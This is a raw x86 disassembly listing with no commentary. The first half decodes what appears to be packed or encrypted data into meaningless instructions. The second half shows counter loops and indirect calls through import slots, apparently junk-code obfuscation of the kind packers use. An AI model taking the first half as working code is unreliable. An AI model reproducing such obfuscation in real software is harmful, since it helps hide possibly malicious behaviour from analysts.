  4048b8:	data16 mov al,ds:0x209559ed
  4048be:	sar    DWORD PTR [eax+0x5d],cl
  4048c1:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4048c3:	mov    ebp,0x279ea4ad
  4048c9:	xchg   DWORD PTR [ebp+0x8],edi
  4048cc:	mov    edi,0xddc164ac
  4048d1:	jae    0x404925
  4048d3:	fmulp  st(7),st
  4048d5:	cmc    
  4048d6:	xchg   bh,ah
  4048d8:	or     DWORD PTR fs:[esi],0xffffff85
  4048dc:	fldenv [eax]
  4048de:	sti    
  4048df:	adc    cl,BYTE PTR [ebp-0x7c]
  4048e2:	in     al,dx
  4048e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048e4:	je     0x404890
  4048e6:	mov    ebp,0x2983000e
  4048eb:	or     al,0x4e
  4048ee:	call   FWORD PTR [ecx-0x1002dbc7]
  4048f4:	dec    ebp
  4048f5:	cmp    BYTE PTR [edx+0x11dc8e0c],bh
  4048fb:	push   ds
  4048fc:	loop   0x4048b5
  4048fe:	mov    cl,0xfe
  404900:	push   eax
  404901:	mov    bh,0x6
  404903:	jg     0x40495d
  404905:	sbb    al,0x3a
  404907:	clc    
  404908:	push   cs
  404909:	mov    edi,0x1d8684d1
  40490e:	mov    al,dl
  404910:	rcl    edi,0x0
  404913:	fisttp DWORD PTR [esi-0x30]
  404916:	lds    edx,FWORD PTR [eax+eax*8]
  404919:	pusha  
  40491a:	das    
  40491b:	aaa    
  40491c:	mov    BYTE PTR [ebp-0x30e7923e],ch
  404922:	xor    DWORD PTR [eax],edi
  404924:	xchg   ebx,eax
  404925:	adc    al,0x55
  404927:	or     al,0xa1
  404929:	mov    edi,0xbc790f53
  40492e:	mov    edi,0x2f7f5d0d
  404933:	or     dl,BYTE PTR [eax]
  404935:	add    eax,0x5afaeb20
  40493a:	xchg   DWORD PTR [ecx-0x1],ebx
  40493d:	rol    BYTE PTR [eax+eax*4+0x4b7ee49e],cl
  404944:	leave  
  404945:	push   esp
  404946:	xchg   esi,eax
  404947:	call   0xe9d6:0x9fd6d5dc
  40494e:	jecxz  0x4048e0
  404950:	dec    edx
  404951:	add    ch,cl
  404953:	test   al,0x71
  404955:	push   ecx
  404956:	cmp    al,ah
  404958:	fisttp DWORD PTR [edi+0xb]
  40495b:	in     eax,dx
  40495c:	jae    0x4048f7
  40495e:	popf   
  40495f:	jo     0x40497a
  404961:	popa   
  404962:	push   ss
  404963:	mov    bl,0x51
  404965:	sub    eax,0x1b8ebee5
  40496a:	arpl   WORD PTR [edi+0x1eab1c28],dx
  404970:	shl    BYTE PTR [esi+0x4b],1
  404973:	in     eax,dx
  404974:	xchg   ebx,eax
  404975:	jmp    0x40491d
  404977:	test   DWORD PTR [edx+edx*4],esi
  40497a:	clc    
  40497b:	in     eax,0xd9
  40497d:	ds sahf 
  40497f:	mov    bh,0x95
  404981:	rcl    ecx,1
  404983:	xor    eax,0xbe3ac952
  404988:	call   0xd5e56016
  40498d:	xchg   edx,eax
  40498e:	imul   edi,DWORD PTR [edi-0x6466f953],0xfe5ce9c7
  404998:	add    BYTE PTR [edx+0x63],bh
  40499b:	jno    0x404997
  40499d:	push   es
  40499e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40499f:	pop    edx
  4049a0:	mov    ebp,0x95e484e4
  4049a5:	in     eax,0xb4
  4049a7:	popf   
  4049a8:	adc    ebx,DWORD PTR ds:0x82934afc
  4049ae:	popaw  
  4049b0:	push   ds
  4049b1:	mov    WORD PTR [edi],ss
  4049b3:	movq   mm6,mm1
  4049b6:	add    BYTE PTR [ebp+0x2fb4436c],cl
  4049bc:	into   
  4049bd:	inc    esp
  4049be:	lods   al,BYTE PTR ds:[esi]
  4049bf:	scas   eax,DWORD PTR es:[edi]
  4049c0:	fcmovbe st,st(0)
  4049c2:	inc    esi
  4049c3:	sub    dl,al
  4049c5:	test   eax,0xb31181cc
  4049ca:	mov    edi,0x1c6a9f37
  4049cf:	and    ecx,eax
  4049d1:	into   
  4049d2:	pop    ebx
  4049d3:	adc    cl,ch
  4049d5:	nop
  4049d6:	call   0x64e7d26b
  4049db:	sbb    ebp,DWORD PTR [edx-0x1ee665b3]
  4049e1:	into   
  4049e2:	or     esi,DWORD PTR [ebx-0x45]
  4049e5:	inc    esp
  4049e6:	outs   dx,BYTE PTR ds:[esi]
  4049e7:	mov    ch,0x72
  4049e9:	dec    esp
  4049ea:	adc    BYTE PTR [ebp+ecx*4+0x17dc1d2a],ah
  4049f1:	and    ebp,ecx
  4049f3:	or     al,0x25
  4049f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049f6:	mov    ds:0x8a21d666,eax
  4049fb:	icebp  
  4049fc:	cmp    ch,bl
  4049fe:	mov    BYTE PTR [esi],dh
  404a00:	adc    al,0xbd
  404a02:	push   es
  404a03:	ins    BYTE PTR es:[edi],dx
  404a04:	add    DWORD PTR ds:0x3664305d,ecx
  404a0a:	jne    0x404a7a
  404a0c:	mov    WORD PTR [ecx+0x623d9d12],gs
  404a12:	or     eax,0x730291c9
  404a17:	and    eax,0xc2c6e438
  404a1c:	mov    ds:0x57620a9b,eax
  404a21:	inc    ebp
  404a22:	pop    esp
  404a23:	out    0xa0,al
  404a25:	std    
  404a26:	fadd   QWORD PTR [edx]
  404a28:	retf   0x8e12
  404a2b:	(bad)  
  404a2c:	or     al,0x2f
  404a2e:	dec    edi
  404a2f:	sbb    al,0x60
  404a31:	or     al,0x8c
  404a33:	jmp    0x404a5c
  404a35:	out    dx,eax
  404a36:	mov    eax,0x68fb6d63
  404a3b:	data16 scas al,BYTE PTR es:[edi]
  404a3d:	int3   
  404a3e:	sbb    ecx,DWORD PTR [edi+0xd48561]
  404a44:	loope  0x404aaa
  404a46:	ret    
  404a47:	push   eax
  404a48:	ds inc edi
  404a4a:	sbb    esi,DWORD PTR [ecx]
  404a4c:	lods   al,BYTE PTR ds:[esi]
  404a4d:	mov    ?,WORD PTR [eax]
  404a4f:	inc    ecx
  404a50:	add    eax,DWORD PTR [eax-0x46]
  404a53:	int3   
  404a54:	push   ecx
  404a55:	dec    esp
  404a56:	ins    BYTE PTR es:[edi],dx
  404a57:	icebp  
  404a58:	pop    ebp
  404a59:	lea    ebx,[edi]
  404a5b:	or     al,0x6
  404a5d:	or     esp,DWORD PTR [esi]
  404a5f:	daa    
  404a60:	inc    ebp
  404a61:	daa    
  404a62:	cmp    ah,ch
  404a64:	jmp    0x404a2a
  404a66:	jo     0x404aa6
  404a68:	inc    ebx
  404a69:	out    0x50,al
  404a6b:	pop    esi
  404a6c:	or     DWORD PTR [edx+edi*2+0x122ec60a],edi
  404a73:	fcomp  st(7)
  404a75:	xor    ch,al
  404a77:	push   0x612aabca
  404a7c:	jae    0x404af1
  404a7e:	scas   al,BYTE PTR es:[edi]
  404a7f:	leave  
  404a80:	push   ss
  404a81:	xor    DWORD PTR [ecx-0x1db3af60],ebx
  404a87:	dec    ecx
  404a88:	pop    eax
  404a89:	iret   
  404a8a:	jmp    0x404aef
  404a8c:	popa   
  404a8d:	mov    DWORD PTR [ebp+ebx*1+0xbe42b38],edi
  404a94:	imul   edx,edx,0xfffffff4
  404a97:	push   ds
  404a98:	mov    ah,0x73
  404a9a:	int3   
  404a9b:	cmp    eax,0xa30a9993
  404aa0:	idiv   BYTE PTR [edi]
  404aa2:	scas   al,BYTE PTR es:[edi]
  404aa3:	sub    al,0x73
  404aa5:	stos   DWORD PTR es:[edi],eax
  404aa6:	sar    BYTE PTR [ebx],0xae
  404aa9:	mov    ah,BYTE PTR [ecx-0x6f]
  404aac:	jnp    0x404b09
  404aae:	sbb    ah,BYTE PTR [ebp-0x834fca7]
  404ab4:	jb     0x404a40
  404ab6:	cmp    eax,0xa98b87dd
  404abb:	mov    bh,0xbf
  404abd:	add    al,0x24
  404abf:	fsubr  DWORD PTR [eax-0x49ce3e08]
  404ac5:	sub    BYTE PTR [ebx-0x17],ah
  404ac8:	mov    bh,0xb4
  404aca:	(bad)  
  404acb:	fld    DWORD PTR [edx+0x2bc3a310]
  404ad1:	push   esp
  404ad2:	lahf   
  404ad3:	and    bl,ch
  404ad5:	inc    ebx
  404ad6:	stos   DWORD PTR es:[edi],eax
  404ad7:	or     BYTE PTR [esi-0x38],bh
  404ada:	mov    edi,0x4cae413d
  404adf:	mov    edi,0xc7ac8f05
  404ae4:	ret    0x39c2
  404ae7:	pushf  
  404ae8:	push   ebx
  404ae9:	cdq    
  404aea:	add    BYTE PTR [eax+0x31],dl
  404aed:	shr    DWORD PTR [ebx+ecx*1+0x75],cl
  404af1:	inc    ecx
  404af2:	mov    edi,0x27393ac7
  404af7:	ret    0x31e5
  404afa:	pop    ebp
  404afb:	xchg   BYTE PTR [edx+0x5fc8454f],al
  404b01:	es cmp bl,cl
  404b04:	or     DWORD PTR [ebp-0x55],ebx
  404b07:	cmp    eax,0x752c14ca
  404b0c:	(bad)  
  404b0d:	mov    al,ds:0xd80a5bd3
  404b12:	repnz dec ecx
  404b14:	mov    ?,WORD PTR [esi-0x64]
  404b17:	add    dl,BYTE PTR [esi+0x45]
  404b1a:	sub    eax,0x3dfbae1
  404b1f:	loope  0x404b26
  404b21:	sub    al,0x49
  404b23:	cli    
  404b24:	dec    esp
  404b25:	xor    edi,DWORD PTR [esi]
  404b27:	xchg   edi,eax
  404b28:	loope  0x404b1b
  404b2a:	jo     0x404b66
  404b2c:	jmp    DWORD PTR [esi-0x2c]
  404b2f:	xchg   edi,eax
  404b30:	ss add eax,0x4948e6a4
  404b36:	sbb    al,0xaf
  404b38:	xchg   ch,dl
  404b3a:	icebp  
  404b3b:	(bad)
  404b3f:	or     DWORD PTR ds:0x86e6d02b,0xe992e9bd
  404b49:	popf   
  404b4a:	cmp    dl,0x7b
  404b4d:	fyl2x  
  404b4f:	mov    ch,BYTE PTR ds:[ebx-0x1d6f6b27]
  404b56:	inc    ecx
  404b57:	mov    esp,0xa024fa60
  404b5c:	pop    ecx
  404b5d:	pop    edx
  404b5e:	arpl   cx,si
  404b60:	push   edi
  404b61:	or     BYTE PTR ds:0x6c0e4c5f,bh
  404b67:	add    eax,0x826cc4d3
  404b6c:	sbb    eax,DWORD PTR [ebp-0x32]
  404b6f:	mov    bh,0x8a
  404b71:	mov    eax,ds:0x532b365d
  404b76:	jnp    0x404bc7
  404b78:	fmul   QWORD PTR [esi]
  404b7a:	inc    edi
  404b7b:	jne    0x404bc0
  404b7d:	jno    0x404b5c
  404b7f:	xchg   edi,eax
  404b80:	aad    0xcf
  404b82:	or     BYTE PTR [ecx],bl
  404b84:	(bad)  [ebx]
  404b86:	cdq    
  404b87:	add    DWORD PTR [ebx+ebx*2-0x31ccd143],esp
  404b8e:	jg     0x404ba3
  404b90:	mov    eax,ds:0xe27c3e20
  404b95:	loop   0x404bdb
  404b97:	xchg   ebx,eax
  404b98:	sub    esi,DWORD PTR [ecx]
  404b9a:	jnp    0x404c0d
  404b9c:	imul   ebx,DWORD PTR [esp+eax*4-0x3acb2148],0xc99f925c
  404ba7:	shl    BYTE PTR [esi+0x67029a81],1
  404bad:	(bad)  
  404bae:	jecxz  0x404bce
  404bb0:	out    0xd6,eax
  404bb2:	xchg   ecx,eax
  404bb3:	xchg   esi,eax
  404bb4:	fst    QWORD PTR [esi+edx*8-0x7f581ea4]
  404bbb:	push   cs
  404bbc:	jmp    0xa699:0x16348de9
  404bc3:	cmp    dl,BYTE PTR [ebx-0x1f]
  404bc6:	sbb    al,0x65
  404bc8:	jge    0x404c2b
  404bca:	(bad)  
  404bcb:	mov    ebp,0xd2bcbff4
  404bd0:	jbe    0x404c51
  404bd2:	jecxz  0x404b56
  404bd4:	mov    al,0xa5
  404bd6:	xchg   esi,eax
  404bd7:	add    DWORD PTR [edx+0x34302143],esp
  404bdd:	jb     0x404bd3
  404bdf:	dec    ebx
  404be0:	int3   
  404be1:	loopne 0x404bbe
  404be3:	hlt    
  404be4:	jnp    0x404c60
  404be6:	inc    edi
  404be7:	or     ch,BYTE PTR [esi+0x1b7fd4c]
  404bed:	xor    edi,0xffffffe2
  404bf0:	ret    0x6a20
  404bf3:	out    0xdf,eax
  404bf5:	mov    dl,0x3b
  404bf7:	fild   QWORD PTR [ebp+0x75]
  404bfa:	out    dx,al
  404bfb:	sub    BYTE PTR [edi-0x4ebced0e],dh
  404c01:	and    DWORD PTR [esi+ecx*8-0x26],0x13
  404c06:	popf   
  404c07:	push   eax
  404c08:	out    dx,al
  404c09:	aaa    
  404c0a:	mov    bl,0x4d
  404c0c:	loop   0x404c58
  404c0e:	inc    ebx
  404c0f:	inc    edi
  404c10:	adc    eax,DWORD PTR [ecx]
  404c12:	idiv   BYTE PTR [ebp+ebp*4-0x29]
  404c16:	in     al,dx
  404c17:	shl    edx,0xb0
  404c1a:	cmp    eax,0xff791230
  404c1f:	inc    eax
  404c20:	mov    eax,ds:0x3b2f4b13
  404c25:	push   DWORD PTR [esi+eiz*2]
  404c28:	mov    ch,0x55
  404c2a:	int3   
  404c2b:	scas   eax,DWORD PTR es:[edi]
  404c2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404c2d:	mov    BYTE PTR [esi-0x13],al
  404c30:	adc    BYTE PTR [eax+0x1149bf8e],dl
  404c36:	mov    al,ds:0x7e1b4bc3
  404c3b:	sub    al,0x1e
  404c3d:	int3   
  404c3e:	mov    ebx,0x5683eb31
  404c43:	popf   
  404c44:	(bad)  
  404c45:	repnz mov ebx,0x1835bd63
  404c4c:	xor    eax,0xb51b7b28
  404c51:	pop    es
  404c52:	pop    eax
  404c53:	retf   0xe168
  404c56:	out    dx,al
  404c57:	sti    
  404c58:	dec    esp
  404c59:	pop    ss
  404c5a:	sar    DWORD PTR [esi-0x1d],1
  404c5d:	push   0xf
  404c5f:	inc    edx
  404c60:	(bad)  
  404c61:	or     dh,al
  404c63:	mov    gs,WORD PTR ds:0x3e8041a7
  404c69:	xchg   ebp,eax
  404c6a:	push   ebx
  404c6b:	xor    DWORD PTR [edi-0x7c1f4c6a],esp
  404c71:	push   edx
  404c72:	test   DWORD PTR [edx],esp
  404c74:	inc    ecx
  404c75:	add    DWORD PTR [esi-0x52],ecx
  404c78:	clc    
  404c79:	js     0x404cd7
  404c7b:	and    al,0xb
  404c7d:	fcomip st,st(2)
  404c7f:	adc    al,0xab
  404c81:	rol    bl,0x26
  404c84:	cmp    al,0x5e
  404c86:	neg    BYTE PTR [edx-0x141e3180]
  404c8c:	mov    eax,0x4a431195
  404c91:	test   esi,0x1849bd97
  404c97:	inc    esi
  404c98:	pop    ss
  404c99:	clc    
  404c9a:	std    
  404c9b:	push   ecx
  404c9c:	(bad)  
  404c9d:	xchg   ebx,eax
  404c9e:	add    esi,ecx
  404ca0:	lea    ecx,[eax]
  404ca2:	jns    0x404cc8
  404ca4:	imul   DWORD PTR [edx]
  404ca6:	in     al,dx
  404ca7:	pop    edx
  404ca8:	sbb    BYTE PTR [ecx+0x5d],dl
  404cab:	inc    esp
  404cac:	or     DWORD PTR [edx+0x7],eax
  404caf:	jno    0x404c45
  404cb1:	push   0x72
  404cb3:	cmp    bh,al
  404cb5:	mov    al,0xef
  404cb7:	les    eax,FWORD PTR [ebx+0x24c34c29]
  404cbd:	sbb    eax,0x70b8ad46
  404cc2:	push   ebp
  404cc3:	test   DWORD PTR [edx],esi
  404cc5:	push   esi
  404cc6:	pushf  
  404cc7:	mov    ds:0x47dfd387,al
  404ccc:	dec    esp
  404ccd:	rcr    BYTE PTR [ecx],1
  404ccf:	mov    ecx,0x3afb8561
  404cd4:	enter  0x572d,0x8c
  404cd8:	rcr    BYTE PTR [edx],1
  404cda:	sbb    edi,ecx
  404cdc:	jp     0x404cea
  404cde:	fucom  st(6)
  404ce0:	imul   esi,DWORD PTR [ebp+0xb],0xf4451374
  404ce7:	ins    DWORD PTR es:[edi],dx
  404ce8:	mov    ebp,0xc60115d
  404ced:	jae    0x404c99
  404cef:	lods   al,BYTE PTR ds:[esi]
  404cf0:	mov    esi,0x84f06f86
  404cf5:	inc    eax
  404cf6:	lds    esp,FWORD PTR [edi+0x3c]
  404cf9:	push   ss
  404cfa:	stos   BYTE PTR es:[edi],al
  404cfb:	jo     0x404d6c
  404cfd:	xchg   DWORD PTR [eax+0x6f6433d3],ebx
  404d03:	neg    bh
  404d05:	sub    eax,0x7ee72d1d
  404d0a:	or     bl,dl
  404d0c:	lds    ebx,FWORD PTR [ebx]
  404d0e:	aam    0x95
  404d10:	ss mov bl,0xa9
  404d13:	xor    BYTE PTR [eax-0x45],ch
  404d16:	imul   esp,DWORD PTR [edi+0x128b3325],0x46
  404d1d:	jmp    0x404d1f
  404d1f:	pop    ebx
  404d20:	ja     0x404d93
  404d22:	cld    
  404d23:	es xchg ebx,eax
  404d25:	test   DWORD PTR [edx],0xbbfc669d
  404d2b:	adc    eax,0xf7c37a96
  404d30:	les    ebx,FWORD PTR [esi]
  404d32:	jne    0x404cd6
  404d34:	icebp  
  404d35:	cmp    esp,DWORD PTR [ebp+0x2b]
  404d38:	mov    al,dh
  404d3a:	das    
  404d3b:	push   ebp
  404d3c:	arpl   WORD PTR [ecx+0x6e4a4415],bp
  404d42:	dec    esp
  404d43:	aas    
  404d44:	inc    ecx
  404d45:	rol    esi,1
  404d47:	push   ebp
  404d48:	jb     0x404daf
  404d4a:	sbb    ch,BYTE PTR [ebx]
  404d4c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404d4d:	imul   BYTE PTR [edi-0x6290391c]
  404d53:	(bad)  
  404d54:	sbb    al,0x15
  404d56:	aaa    
  404d57:	push   0xffffffc8
  404d59:	lods   eax,DWORD PTR ds:[esi]
  404d5a:	pop    ds
  404d5b:	nop
  404d5c:	xchg   edi,eax
  404d5d:	cwde   
  404d5e:	mov    bh,0x7c
  404d60:	xor    cl,BYTE PTR [esi+0x3c091771]
  404d66:	fwait
  404d67:	outs   dx,BYTE PTR ds:[esi]
  404d68:	retf   0xac13
  404d6b:	stc    
  404d6c:	(bad)  
  404d6d:	cmp    BYTE PTR [edx+0x68],bl
  404d70:	cli    
  404d71:	pusha  
  404d72:	jmp    0x404cf4
  404d74:	gs retf 
  404d76:	fnstsw WORD PTR [ebx-0x59]
  404d79:	out    0x33,eax
  404d7b:	jns    0x404db6
  404d7d:	mov    dl,0xc5
  404d7f:	lods   eax,DWORD PTR ds:[esi]
  404d80:	dec    edx
  404d81:	out    0xed,eax
  404d83:	(bad)  
  404d84:	std    
  404d85:	jmp    0x404de4
  404d87:	xor    ah,dl
  404d89:	ins    BYTE PTR es:[edi],dx
  404d8a:	data16 int 0xb3
  404d8d:	xchg   esi,eax
  404d8e:	loope  0x404db0
  404d90:	(bad)  
  404d91:	popa   
  404d92:	sub    eax,0x5cf240a1
  404d97:	loop   0x404d5d
  404d99:	sahf   
  404d9a:	(bad)  
  404d9b:	pop    ds
  404d9c:	or     DWORD PTR [eax],0x6e
  404d9f:	dec    esi
  404da0:	loopne 0x404d48
  404da2:	pop    eax
  404da3:	inc    eax
  404da4:	xlat   BYTE PTR ds:[ebx]
  404da5:	sub    dl,bl
  404da7:	pop    ecx
  404da8:	xchg   ecx,eax
  404da9:	arpl   WORD PTR [ebx],dx
  404dab:	rcl    dh,cl
  404dad:	push   ss
  404dae:	dec    edx
  404daf:	test   al,0x70
  404db1:	fistp  WORD PTR [esi-0x3b07b3d8]
  404db7:	call   0x9dd3:0xb1ce2dc1
  404dbe:	je     0x404e19
  404dc0:	xchg   edi,eax
  404dc1:	adc    BYTE PTR [ebx-0x7b],bl
  404dc4:	or     DWORD PTR [esi+eax*8],ebx
  404dc7:	pop    esi
  404dc8:	push   0x4dd7382f
  404dcd:	mov    esp,0xfda81ea7
  404dd2:	stc    
  404dd3:	nop
  404dd4:	je     0x404de6
  404dd6:	mov    ah,0x34
  404dd8:	call   0xc8d8:0x65d29478
  404ddf:	outs   dx,BYTE PTR ds:[esi]
  404de0:	push   0xffffff99
  404de2:	pop    edx
  404de3:	repz ja 0x404dbd
  404de6:	xor    eax,0x809b3dc7
  404deb:	mov    eax,ds:0xbc355634
  404df0:	lock ret 0x7b05
  404df4:	cmp    ebx,esp
  404df6:	jl     0x404d9a
  404df8:	je     0x404ed6
  404dfe:	and    eax,DWORD PTR ds:0x42b010
  404e04:	mov    eax,DWORD PTR [ebp+0x14]
  404e07:	and    DWORD PTR ds:0x42901c,0x0
  404e11:	jmp    0x404e23
  404e16:	mov    ebx,DWORD PTR ds:0x42901c
  404e1c:	inc    ebx
  404e1d:	mov    DWORD PTR ds:0x42901c,ebx
  404e23:	cmp    DWORD PTR ds:0x42901c,0x11
  404e2a:	jae    0x404e6a
  404e30:	cmp    DWORD PTR ds:0x42901c,0x1a
  404e37:	jne    0x404e53
  404e3d:	push   DWORD PTR [ebp-0x18]
  404e40:	push   DWORD PTR [ebp-0x28]
  404e43:	push   0x42e0e0
  404e48:	push   0x400000
  404e4d:	call   DWORD PTR ds:0x42e8eb
  404e53:	jmp    0x404e16
  404e58:	mov    ebx,DWORD PTR ds:0x42a01c
  404e5e:	sub    ebx,DWORD PTR ds:0x42d008
  404e64:	mov    DWORD PTR ds:0x42a01c,ebx
  404e6a:	mov    eax,DWORD PTR [eax]
  404e6c:	and    DWORD PTR ds:0x42b01c,0x0
  404e76:	mov    ebx,DWORD PTR ds:0x42b01c
  404e7c:	inc    ebx
  404e7d:	mov    DWORD PTR ds:0x42b01c,ebx
  404e83:	cmp    DWORD PTR ds:0x42b01c,0x6
  404e8a:	jne    0x404e96
  404e90:	call   DWORD PTR ds:0x42e8ef
  404e96:	cmp    DWORD PTR ds:0x42b01c,0x5
  404e9d:	jne    0x404eb2
  404ea3:	xor    ebx,ebx
  404ea5:	or     ebx,DWORD PTR ds:0x42b01c
  404eab:	inc    ebx
  404eac:	mov    DWORD PTR ds:0x42b01c,ebx
  404eb2:	cmp    DWORD PTR ds:0x42b01c,0x12
  404eb9:	jb     0x404e76
  404ebf:	xor    ebx,ebx
  404ec1:	or     ebx,DWORD PTR ds:0x429000
  404ec7:	add    ebx,DWORD PTR ds:0x42d014
  404ecd:	mov    DWORD PTR ds:0x429000,ebx
  404ed3:	mov    DWORD PTR [ebp-0x1c],eax
  404ed6:	mov    eax,ds:0x41cd65
  404edb:	mov    ebx,DWORD PTR ds:0x41ce0c
  404ee1:	sub    ebx,eax
  404ee3:	or     eax,DWORD PTR [eax+ebx*1]
  404ee6:	mov    eax,DWORD PTR [ebp-0x4]
  404ee9:	mov    DWORD PTR ds:0x42900c,0x13
  404ef3:	cmp    DWORD PTR ds:0x42900c,0x0
  404efa:	je     0x404f3f
  404f00:	cmp    DWORD PTR ds:0x42900c,0xa
  404f07:	jne    0x404f13
  404f0d:	call   DWORD PTR ds:0x42e8f3
  404f13:	cmp    DWORD PTR ds:0x42900c,0xb
  404f1a:	jne    0x404f2d
  404f20:	mov    ebx,DWORD PTR ds:0x42900c
  404f26:	dec    ebx
  404f27:	mov    DWORD PTR ds:0x42900c,ebx
  404f2d:	mov    ebx,DWORD PTR ds:0x42900c
  404f33:	dec    ebx
  404f34:	mov    DWORD PTR ds:0x42900c,ebx
  404f3a:	jmp    0x404ef3
  404f3f:	xor    eax,esi
  404f41:	add    ebx,0x5bdd
  404f47:	add    eax,edi
  404f49:	mov    DWORD PTR [ebp-0x8],eax
  404f4c:	and    ebx,eax
  404f4e:	mov    eax,DWORD PTR [ebp-0xc]
  404f51:	sbb    DWORD PTR ds:0x42a000,ecx
  404f57:	xor    eax,esi
  404f59:	add    eax,edi
  404f5b:	and    DWORD PTR ds:0x42b018,0x0
  404f65:	mov    ebx,DWORD PTR ds:0x42b018
  404f6b:	inc    ebx
  404f6c:	mov    DWORD PTR ds:0x42b018,ebx
  404f72:	cmp    DWORD PTR ds:0x42b018,0x1f
  404f79:	jne    0x404f8a
  404f7f:	push   0x42e0ac
  404f84:	call   DWORD PTR ds:0x42e8f7
  404f8a:	cmp    DWORD PTR ds:0x42b018,0x12
  404f91:	jb     0x404f65
  404f97:	mov    DWORD PTR [ebp-0x24],eax
  404f9a:	mov    eax,DWORD PTR [ebp-0x4]
  404f9d:	xor    eax,esi
  404f9f:	add    eax,edi
  404fa1:	mov    DWORD PTR [ebp-0x30],eax
  404fa4:	mov    ebx,DWORD PTR [ebp-0x4]
  404fa7:	mov    eax,ds:0x41cd79
  404fac:	mov    eax,DWORD PTR [eax]
  404fae:	xor    DWORD PTR ds:0x42900c,eax
  404fb4:	xor    ebx,esi
  404fb6:	add    ebx,edi
  404fb8:	mov    DWORD PTR ds:0x42c01c,0x1a
  404fc2:	cmp    DWORD PTR ds:0x42c01c,0x0
  404fc9:	je     0x4050fc
  404fcf:	cmp    DWORD PTR ds:0x42c01c,0x3
  404fd6:	jne    0x404fe7
  404fdc:	push   0x42e018
  404fe1:	call   DWORD PTR ds:0x42e8fb
  404fe7:	cmp    DWORD PTR ds:0x42c01c,0x4
  404fee:	jne    0x404fff
  404ff4:	mov    eax,ds:0x42c01c
  404ff9:	dec    eax
  404ffa:	mov    ds:0x42c01c,eax
  404fff:	mov    eax,ds:0x42c01c
  405004:	dec    eax
  405005:	mov    ds:0x42c01c,eax
  40500a:	jmp    0x404fc2
  40500f:	mov    DWORD PTR ds:0x42b010,0x1e
  405019:	cmp    DWORD PTR ds:0x42b010,0x0
  405020:	je     0x4050fc
  405026:	cmp    DWORD PTR ds:0x42b010,0x29
  40502d:	jne    0x405039
  405033:	call   DWORD PTR ds:0x42e8ff
  405039:	mov    eax,ds:0x42b010
  40503e:	dec    eax
  40503f:	mov    ds:0x42b010,eax
  405044:	jmp    0x405019
  405049:	mov    DWORD PTR ds:0x42a004,0x16
  405053:	cmp    DWORD PTR ds:0x42a004,0x0
  40505a:	je     0x4050fc
  405060:	cmp    DWORD PTR ds:0x42a004,0xb
  405067:	jne    0x405082
  40506d:	push   0x6cef
  405072:	push   0x42a000
  405077:	push   0x4fd9
  40507c:	call   DWORD PTR ds:0x42e903
  405082:	cmp    DWORD PTR ds:0x42a004,0xc
  405089:	jne    0x40509a
  40508f:	mov    eax,ds:0x42a004
  405094:	dec    eax
  405095:	mov    ds:0x42a004,eax
  40509a:	mov    eax,ds:0x42a004
  40509f:	dec    eax
  4050a0:	mov    ds:0x42a004,eax
  4050a5:	jmp    0x405053
  4050aa:	mov    DWORD PTR ds:0x42901c,0x1f
  4050b4:	cmp    DWORD PTR ds:0x42901c,0x0
  4050bb:	je     0x4050fc
  4050c1:	cmp    DWORD PTR ds:0x42901c,0x22
  4050c8:	jne    0x4050e2
  4050ce:	push   DWORD PTR [ebp-0x1c]
  4050d1:	push   0x7ea8
  4050d6:	push   DWORD PTR [ebp-0x10]
  4050d9:	push   DWORD PTR [ebp-0x28]
  4050dc:	call   DWORD PTR ds:0x42e8c3
  4050e2:	mov    eax,ds:0x42901c
  4050e7:	dec    eax
  4050e8:	mov    ds:0x42901c,eax
  4050ed:	jmp    0x4050b4
  4050f2:	and    DWORD PTR ds:0x42d008,0x7d7b
  4050fc:	mov    eax,DWORD PTR [ebp-0x24]
  4050ff:	sub    eax,edi
  405101:	lea    ecx,[ebx-0x3272e2]
  405107:	and    DWORD PTR ds:0x42d00c,0x483b
  405111:	xor    eax,esi
  405113:	sub    DWORD PTR ds:0x42a000,0x7f75
  40511d:	xor    ecx,esi
  40511f:	cmp    ecx,eax
  405121:	mov    DWORD PTR ds:0x429010,0x207a
  40512b:	je     0x405268
  405131:	mov    eax,DWORD PTR [ebp-0x4]
  405134:	add    DWORD PTR ds:0x42a004,0x429018
  40513e:	xor    eax,esi
  405140:	add    eax,edi
  405142:	mov    DWORD PTR ds:0x42d010,0x65f6
  40514c:	cmp    ebx,eax
  40514e:	mov    DWORD PTR ds:0x42b00c,0x5c1b
  405158:	jne    0x405245
  40515e:	or     DWORD PTR ds:0x42a018,0x42d00c
  405168:	push   DWORD PTR [ebp+0x8]
  40516b:	sbb    DWORD PTR ds:0x429020,0x6ddf
  405175:	call   0x402803
  40517a:	mov    DWORD PTR ds:0x42a014,0x17
  405184:	cmp    DWORD PTR ds:0x42a014,0x0
  40518b:	je     0x4051de
  405191:	cmp    DWORD PTR ds:0x42a014,0xc
  405198:	jne    0x4051b2
  40519e:	push   0x42d5
  4051a3:	push   DWORD PTR [ebp-0x20]
  4051a6:	push   DWORD PTR [ebp-0x24]
  4051a9:	push   DWORD PTR [ebp-0x28]
  4051ac:	call   DWORD PTR ds:0x42e8c7
  4051b2:	cmp    DWORD PTR ds:0x42a014,0xd
  4051b9:	jne    0x4051cc
  4051bf:	mov    ecx,DWORD PTR ds:0x42a014
  4051c5:	dec    ecx
  4051c6:	mov    DWORD PTR ds:0x42a014,ecx
  4051cc:	mov    ecx,DWORD PTR ds:0x42a014
  4051d2:	dec    ecx
  4051d3:	mov    DWORD PTR ds:0x42a014,ecx
  4051d9:	jmp    0x405184
  4051de:	mov    DWORD PTR [ebp-0x14],eax
  4051e1:	mov    eax,DWORD PTR [ebp-0x4]
  4051e4:	mov    ecx,DWORD PTR [ebp-0x14]
  4051e7:	xor    eax,esi
  4051e9:	add    eax,edi
  4051eb:	cmp    ecx,eax
  4051ed:	je     0x4052d3
  4051f3:	push   DWORD PTR [ebp-0x14]
  4051f6:	push   DWORD PTR [ebp+0x8]
  4051f9:	call   0x40ea45
  4051fe:	mov    DWORD PTR [ebp-0x14],eax
  405201:	mov    eax,DWORD PTR [ebp-0x4]
  405204:	mov    ecx,DWORD PTR [ebp-0x14]
  405207:	xor    eax,esi
  405209:	add    eax,edi
  40520b:	cmp    ecx,eax
  40520d:	je     0x4052d3
  405213:	mov    eax,DWORD PTR [ebp-0x14]
